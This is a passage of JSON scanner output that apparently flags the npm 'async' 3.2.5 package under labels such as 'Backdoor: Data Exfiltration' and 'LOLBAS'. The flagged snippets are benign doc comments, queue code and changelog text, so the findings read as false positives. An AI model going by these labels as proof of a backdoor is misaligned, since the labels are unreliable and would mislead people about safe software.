                  "snippet": {
                    "text": " *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                    "rendered": {
                      "text": " *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                      "markdown": "` *\n * Note, due to JavaScript limitations, we can only detect native `async`\n * functions and not transpilied implementations.\n * Your environment must have `async`/`await` support for this to work.\n * (e.g. Node > v7.6, or a recent version of a modern browser).\n * If you are using `async` functions through a transpiler (e.g. Babel), you\n * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2291,
                  "startColumn": 23,
                  "endLine": 2291,
                  "endColumn": 31,
                  "snippet": {
                    "text": " * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n *     }],\n *     //...\n",
                    "rendered": {
                      "text": " * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n *     }],\n *     //...\n",
                      "markdown": "` * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n *     }],\n *     //...\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 2289,
                  "startColumn": 7,
                  "endLine": 2289,
                  "endColumn": 15,
                  "snippet": {
                    "text": " * ], callback);\n *\n * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n",
                    "rendered": {
                      "text": " * ], callback);\n *\n * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n",
                      "markdown": "` * ], callback);\n *\n * async.auto({\n *     hostname: async.constant(\"https://server.net/\"),\n *     port: findFreePort,\n *     launchServer: [\"hostname\", \"port\", function (options, cb) {\n *         startServer(options, cb);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/package.json"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 52,
                  "endLine": 61,
                  "endColumn": 58,
                  "snippet": {
                    "text": "  },\n  \"scripts\": {\n    \"coverage\": \"nyc npm run mocha-node-test -- --grep @nycinvalid --invert\",\n    \"jsdoc\": \"jsdoc -c ./support/jsdoc/jsdoc.json && node support/jsdoc/jsdoc-fix-html.js\",\n    \"lint\": \"eslint --fix .\",\n    \"mocha-browser-test\": \"karma start\",\n    \"mocha-node-test\": \"mocha\",\n",
                    "rendered": {
                      "text": "  },\n  \"scripts\": {\n    \"coverage\": \"nyc npm run mocha-node-test -- --grep @nycinvalid --invert\",\n    \"jsdoc\": \"jsdoc -c ./support/jsdoc/jsdoc.json && node support/jsdoc/jsdoc-fix-html.js\",\n    \"lint\": \"eslint --fix .\",\n    \"mocha-browser-test\": \"karma start\",\n    \"mocha-node-test\": \"mocha\",\n",
                      "markdown": "`  },\n  \"scripts\": {\n    \"coverage\": \"nyc npm run mocha-node-test -- --grep @nycinvalid --invert\",\n    \"jsdoc\": \"jsdoc -c ./support/jsdoc/jsdoc.json && node support/jsdoc/jsdoc-fix-html.js\",\n    \"lint\": \"eslint --fix .\",\n    \"mocha-browser-test\": \"karma start\",\n    \"mocha-node-test\": \"mocha\",\n`"
                    }
                  },
                  "sourceLanguage": "package.json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/internal/queue.js"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 23,
                  "endLine": 225,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n",
                    "rendered": {
                      "text": "                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n",
                      "markdown": "`                var l = q._tasks.length;\n                if (q.payload) l = Math.min(l, q.payload);\n                for (var i = 0; i < l; i++) {\n                    var node = q._tasks.shift();\n                    tasks.push(node);\n                    workersList.push(node);\n                    data.push(node.data);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.js"
                },
                "region": {
                  "startLine": 1664,
                  "startColumn": 27,
                  "endLine": 1664,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                    var l = q._tasks.length;\n                    if (q.payload) l = Math.min(l, q.payload);\n                    for (var i = 0; i < l; i++) {\n                        var node = q._tasks.shift();\n                        tasks.push(node);\n                        workersList.push(node);\n                        data.push(node.data);\n",
                    "rendered": {
                      "text": "                    var l = q._tasks.length;\n                    if (q.payload) l = Math.min(l, q.payload);\n                    for (var i = 0; i < l; i++) {\n                        var node = q._tasks.shift();\n                        tasks.push(node);\n                        workersList.push(node);\n                        data.push(node.data);\n",
                      "markdown": "`                    var l = q._tasks.length;\n                    if (q.payload) l = Math.min(l, q.payload);\n                    for (var i = 0; i < l; i++) {\n                        var node = q._tasks.shift();\n                        tasks.push(node);\n                        workersList.push(node);\n                        data.push(node.data);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.js"
                },
                "region": {
                  "startLine": 1990,
                  "startColumn": 10,
                  "endLine": 1990,
                  "endColumn": 15,
                  "snippet": {
                    "text": "     * // Part of an app, that fetches cats of the logged user.\n     * // This example uses `seq` function to avoid overnesting and error\n     * // handling clutter.\n     * app.get('/cats', function(request, response) {\n     *     var User = request.models.User;\n     *     async.seq(\n     *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                    "rendered": {
                      "text": "     * // Part of an app, that fetches cats of the logged user.\n     * // This example uses `seq` function to avoid overnesting and error\n     * // handling clutter.\n     * app.get('/cats', function(request, response) {\n     *     var User = request.models.User;\n     *     async.seq(\n     *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                      "markdown": "`     * // Part of an app, that fetches cats of the logged user.\n     * // This example uses `seq` function to avoid overnesting and error\n     * // handling clutter.\n     * app.get('/cats', function(request, response) {\n     *     var User = request.models.User;\n     *     async.seq(\n     *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.js"
                },
                "region": {
                  "startLine": 5835,
                  "startColumn": 12,
                  "endLine": 5835,
                  "endColumn": 40,
                  "snippet": {
                    "text": "     *\n     * Note, due to JavaScript limitations, we can only detect native `async`\n     * functions and not transpilied implementations.\n     * Your environment must have `async`/`await` support for this to work.\n     * (e.g. Node > v7.6, or a recent version of a modern browser).\n     * If you are using `async` functions through a transpiler (e.g. Babel), you\n     * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                    "rendered": {
                      "text": "     *\n     * Note, due to JavaScript limitations, we can only detect native `async`\n     * functions and not transpilied implementations.\n     * Your environment must have `async`/`await` support for this to work.\n     * (e.g. Node > v7.6, or a recent version of a modern browser).\n     * If you are using `async` functions through a transpiler (e.g. Babel), you\n     * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n",
                      "markdown": "`     *\n     * Note, due to JavaScript limitations, we can only detect native `async`\n     * functions and not transpilied implementations.\n     * Your environment must have `async`/`await` support for this to work.\n     * (e.g. Node > v7.6, or a recent version of a modern browser).\n     * If you are using `async` functions through a transpiler (e.g. Babel), you\n     * must still wrap the function with [asyncify]{@link module:Utils.asyncify},\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 221,
                  "endLine": 195,
                  "endColumn": 230,
                  "snippet": {
                    "text": ". ([#1088](https://github.com/caolan/async/issues/1088))\n\n## Breaking changes\n\n- Calling a callback more than once is considered an error, and an error will be thrown. This had an explicit breaking change in `waterfall`. If you were relying on this behavior, you should more accurately represent your control flow as an event emitter or stream. ([#814](https://github.com/caolan/async/issues/814), [#815](https://github.com/caolan/async/issues/815), [#1048](https://github.com/caolan/async/issues/1048), [#1050](https://github.com/caolan/async/issues/1050))\n- `auto` task functions now always take the callbac",
                    "rendered": {
                      "text": ". ([#1088](https://github.com/caolan/async/issues/1088))\n\n## Breaking changes\n\n- Calling a callback more than once is considered an error, and an error will be thrown. This had an explicit breaking change in `waterfall`. If you were relying on this behavior, you should more accurately represent your control flow as an event emitter or stream. ([#814](https://github.com/caolan/async/issues/814), [#815](https://github.com/caolan/async/issues/815), [#1048](https://github.com/caolan/async/issues/1048), [#1050](https://github.com/caolan/async/issues/1050))\n- `auto` task functions now always take the callbac",
                      "markdown": "`. ([#1088](https://github.com/caolan/async/issues/1088))\n\n## Breaking changes\n\n- Calling a callback more than once is considered an error, and an error will be thrown. This had an explicit breaking change in `waterfall`. If you were relying on this behavior, you should more accurately represent your control flow as an event emitter or stream. ([#814](https://github.com/caolan/async/issues/814), [#815](https://github.com/caolan/async/issues/815), [#1048](https://github.com/caolan/async/issues/1048), [#1050](https://github.com/caolan/async/issues/1050))\n- `auto` task functions now always take the callbac`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 295,
                  "startColumn": 137,
                  "endLine": 295,
                  "endColumn": 143,
                  "snippet": {
                    "text": "New Features:\n\n- Added `timesLimit` ([#743](https://github.com/caolan/async/issues/743))\n- `concurrency` can be changed after initialization in `queue` by setting `q.concurrency`. The new concurrency will be reflected the next time a task is processed. ([#747](https://github.com/caolan/async/issues/747), [#772](https://github.com/caolan/async/issues/772))\n\nBug Fixes:\n\n",
                    "rendered": {
                      "text": "New Features:\n\n- Added `timesLimit` ([#743](https://github.com/caolan/async/issues/743))\n- `concurrency` can be changed after initialization in `queue` by setting `q.concurrency`. The new concurrency will be reflected the next time a task is processed. ([#747](https://github.com/caolan/async/issues/747), [#772](https://github.com/caolan/async/issues/772))\n\nBug Fixes:\n\n",
                      "markdown": "`New Features:\n\n- Added `timesLimit` ([#743](https://github.com/caolan/async/issues/743))\n- `concurrency` can be changed after initialization in `queue` by setting `q.concurrency`. The new concurrency will be reflected the next time a task is processed. ([#747](https://github.com/caolan/async/issues/747), [#772](https://github.com/caolan/async/issues/772))\n\nBug Fixes:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 112,
                  "endLine": 199,
                  "endColumn": 120,
                  "snippet": {
                    "text": " libraries.  The previous object behavior has been split out into `mapValues`. ([#1157](https://github.com/caolan/async/issues/1157), [#1177](https://github.com/caolan/async/issues/1177))\n- `filter`, `reject`, `some`, `every`, `detect` and their families like `{METHOD}Series` and `{METHOD}Limit` now expect an error as the first callback argument, rather than just a simple boolean. Pass `null` as the first argument, or use `fs.access` instead of `fs.exists`. ([#118](https://github.com/caolan/async/issues/118), [#774](https://github.com/caolan/async/issues/774), [#1028](https://github.com/caolan/async/i",
                    "rendered": {
                      "text": " libraries.  The previous object behavior has been split out into `mapValues`. ([#1157](https://github.com/caolan/async/issues/1157), [#1177](https://github.com/caolan/async/issues/1177))\n- `filter`, `reject`, `some`, `every`, `detect` and their families like `{METHOD}Series` and `{METHOD}Limit` now expect an error as the first callback argument, rather than just a simple boolean. Pass `null` as the first argument, or use `fs.access` instead of `fs.exists`. ([#118](https://github.com/caolan/async/issues/118), [#774](https://github.com/caolan/async/issues/774), [#1028](https://github.com/caolan/async/i",
                      "markdown": "` libraries.  The previous object behavior has been split out into `mapValues`. ([#1157](https://github.com/caolan/async/issues/1157), [#1177](https://github.com/caolan/async/issues/1177))\n- `filter`, `reject`, `some`, `every`, `detect` and their families like `{METHOD}Series` and `{METHOD}Limit` now expect an error as the first callback argument, rather than just a simple boolean. Pass `null` as the first argument, or use `fs.access` instead of `fs.exists`. ([#118](https://github.com/caolan/async/issues/118), [#774](https://github.com/caolan/async/issues/774), [#1028](https://github.com/caolan/async/i`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 69,
                  "endLine": 187,
                  "endColumn": 75,
                  "snippet": {
                    "text": "an/async/issues/635), [#637](https://github.com/caolan/async/issues/637))\n- Added `retryable`, a relative of `retry` that wraps an async function, making it retry when called. ([#1058](https://github.com/caolan/async/issues/1058))\n- `retry` now supports specifying a function that determines the next time interval, useful for exponential backoff, logging and other retry strategies. ([#1161](https://github.com/caolan/async/issues/1161))\n- `retry` will now pass all of the arguments the task function was resolved with to the callback ([#1231](https://github.com/caolan/async/issues/1231)).\n- Added `q.uns",
                    "rendered": {
                      "text": "an/async/issues/635), [#637](https://github.com/caolan/async/issues/637))\n- Added `retryable`, a relative of `retry` that wraps an async function, making it retry when called. ([#1058](https://github.com/caolan/async/issues/1058))\n- `retry` now supports specifying a function that determines the next time interval, useful for exponential backoff, logging and other retry strategies. ([#1161](https://github.com/caolan/async/issues/1161))\n- `retry` will now pass all of the arguments the task function was resolved with to the callback ([#1231](https://github.com/caolan/async/issues/1231)).\n- Added `q.uns",
                      "markdown": "`an/async/issues/635), [#637](https://github.com/caolan/async/issues/637))\n- Added `retryable`, a relative of `retry` that wraps an async function, making it retry when called. ([#1058](https://github.com/caolan/async/issues/1058))\n- `retry` now supports specifying a function that determines the next time interval, useful for exponential backoff, logging and other retry strategies. ([#1161](https://github.com/caolan/async/issues/1161))\n- `retry` will now pass all of the arguments the task function was resolved with to the callback ([#1231](https://github.com/caolan/async/issues/1231)).\n- Added `q.uns`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 485,
                  "endLine": 168,
                  "endColumn": 491,
                  "snippet": {
                    "text": "ask -- these deferrals have been removed. A `setImmediate` call can add up to 1ms of delay. This might not seem like a lot, but it can add up if you are using many Async functions in the course of processing a HTTP request, for example. Nearly all asynchronous functions that do I/O already have some sort of deferral built in, so the extra deferral is unnecessary. The trade-off of this change is removing our built-in stack-overflow defense. Many synchronous callback calls in series can quickly overflow the JS call stack. If you do have a function that is sometimes synchronous (calling its callback on",
                    "rendered": {
                      "text": "ask -- these deferrals have been removed. A `setImmediate` call can add up to 1ms of delay. This might not seem like a lot, but it can add up if you are using many Async functions in the course of processing a HTTP request, for example. Nearly all asynchronous functions that do I/O already have some sort of deferral built in, so the extra deferral is unnecessary. The trade-off of this change is removing our built-in stack-overflow defense. Many synchronous callback calls in series can quickly overflow the JS call stack. If you do have a function that is sometimes synchronous (calling its callback on",
                      "markdown": "`ask -- these deferrals have been removed. A `setImmediate` call can add up to 1ms of delay. This might not seem like a lot, but it can add up if you are using many Async functions in the course of processing a HTTP request, for example. Nearly all asynchronous functions that do I/O already have some sort of deferral built in, so the extra deferral is unnecessary. The trade-off of this change is removing our built-in stack-overflow defense. Many synchronous callback calls in series can quickly overflow the JS call stack. If you do have a function that is sometimes synchronous (calling its callback on`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 74,
                  "endLine": 102,
                  "endColumn": 82,
                  "snippet": {
                    "text": "ync/pull/1424))\n\n# v2.4.1\n- Fixed a bug preventing functions wrapped  with `timeout()` from being re-used. ([#1418](https://github.com/caolan/async/issues/1418), [#1419](https://github.com/caolan/async/issues/1419))\n\n# v2.4.0\n- Added `tryEach`, for running async functions in parallel, where you only expect one to succeed. ([#1365](https://github.com/caolan/async/issues/1365), [#687](https://github.com/caolan/async/issues/687))\n- Improved performance, most notably in `parallel` and `waterfall` ([#1395](https://github.com/caolan/async/issues/1395))\n- Added `queue.remove()`, for removing items in a `queu",
                    "rendered": {
                      "text": "ync/pull/1424))\n\n# v2.4.1\n- Fixed a bug preventing functions wrapped  with `timeout()` from being re-used. ([#1418](https://github.com/caolan/async/issues/1418), [#1419](https://github.com/caolan/async/issues/1419))\n\n# v2.4.0\n- Added `tryEach`, for running async functions in parallel, where you only expect one to succeed. ([#1365](https://github.com/caolan/async/issues/1365), [#687](https://github.com/caolan/async/issues/687))\n- Improved performance, most notably in `parallel` and `waterfall` ([#1395](https://github.com/caolan/async/issues/1395))\n- Added `queue.remove()`, for removing items in a `queu",
                      "markdown": "`ync/pull/1424))\n\n# v2.4.1\n- Fixed a bug preventing functions wrapped  with `timeout()` from being re-used. ([#1418](https://github.com/caolan/async/issues/1418), [#1419](https://github.com/caolan/async/issues/1419))\n\n# v2.4.0\n- Added `tryEach`, for running async functions in parallel, where you only expect one to succeed. ([#1365](https://github.com/caolan/async/issues/1365), [#687](https://github.com/caolan/async/issues/687))\n- Improved performance, most notably in `parallel` and `waterfall` ([#1395](https://github.com/caolan/async/issues/1395))\n- Added `queue.remove()`, for removing items in a `queu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 103,
                  "endLine": 56,
                  "endColumn": 109,
                  "snippet": {
                    "text": " => {\n    const resp = await fetch(url)\n    return resp.body\n})\n```\n\n## Breaking Changes\n- Most Async methods return a Promise when the final callback is omitted, making them `await`-able! (#1572)\n- We are now making heavy use of ES2015 features, this means we have dropped out-of-the-box support for Node 4 and earlier, and many old versions of browsers. (#1541, #1553)\n- In `queue`, `priorityQueue`, `cargo` and `cargoQueue`, the \"event\"-style methods, like `q.drain` and `q.saturated` are now methods that register a callback, rather than properties you assign a callback to.  They are now of the form `",
                    "rendered": {
                      "text": " => {\n    const resp = await fetch(url)\n    return resp.body\n})\n```\n\n## Breaking Changes\n- Most Async methods return a Promise when the final callback is omitted, making them `await`-able! (#1572)\n- We are now making heavy use of ES2015 features, this means we have dropped out-of-the-box support for Node 4 and earlier, and many old versions of browsers. (#1541, #1553)\n- In `queue`, `priorityQueue`, `cargo` and `cargoQueue`, the \"event\"-style methods, like `q.drain` and `q.saturated` are now methods that register a callback, rather than properties you assign a callback to.  They are now of the form `",
                      "markdown": "` => {\n    const resp = await fetch(url)\n    return resp.body\n})\n```\n\n## Breaking Changes\n- Most Async methods return a Promise when the final callback is omitted, making them `await`-able! (#1572)\n- We are now making heavy use of ES2015 features, this means we have dropped out-of-the-box support for Node 4 and earlier, and many old versions of browsers. (#1541, #1553)\n- In `queue`, `priorityQueue`, `cargo` and `cargoQueue`, the \"event\"-style methods, like `q.drain` and `q.saturated` are now methods that register a callback, rather than properties you assign a callback to.  They are now of the form ``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/CHANGELOG.md"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 62,
                  "endLine": 253,
                  "endColumn": 114,
                  "snippet": {
                    "text": "\n- Add in overlooked `detectLimit` method ([#866](https://github.com/caolan/async/issues/866))\n- Removed unnecessary files from npm releases ([#861](https://github.com/caolan/async/issues/861))\n- Removed usage of a reserved word to prevent :boom: in older environments ([#870](https://github.com/caolan/async/issues/870))\n\n# v1.4.0\n\n",
                    "rendered": {
                      "text": "\n- Add in overlooked `detectLimit` method ([#866](https://github.com/caolan/async/issues/866))\n- Removed unnecessary files from npm releases ([#861](https://github.com/caolan/async/issues/861))\n- Removed usage of a reserved word to prevent :boom: in older environments ([#870](https://github.com/caolan/async/issues/870))\n\n# v1.4.0\n\n",
                      "markdown": "`\n- Add in overlooked `detectLimit` method ([#866](https://github.com/caolan/async/issues/866))\n- Removed unnecessary files from npm releases ([#861](https://github.com/caolan/async/issues/861))\n- Removed usage of a reserved word to prevent :boom: in older environments ([#870](https://github.com/caolan/async/issues/870))\n\n# v1.4.0\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/seq.js"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 6,
                  "endLine": 41,
                  "endColumn": 11,
                  "snippet": {
                    "text": " * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                    "rendered": {
                      "text": " * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n",
                      "markdown": "` * // Part of an app, that fetches cats of the logged user.\n * // This example uses `seq` function to avoid overnesting and error\n * // handling clutter.\n * app.get('/cats', function(request, response) {\n *     var User = request.models.User;\n *     async.seq(\n *         User.get.bind(User),  // 'User.get' has signature (id, callback(err, data))\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/index.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 2334,
                  "endLine": 4,
                  "endColumn": 2340,
                  "snippet": {
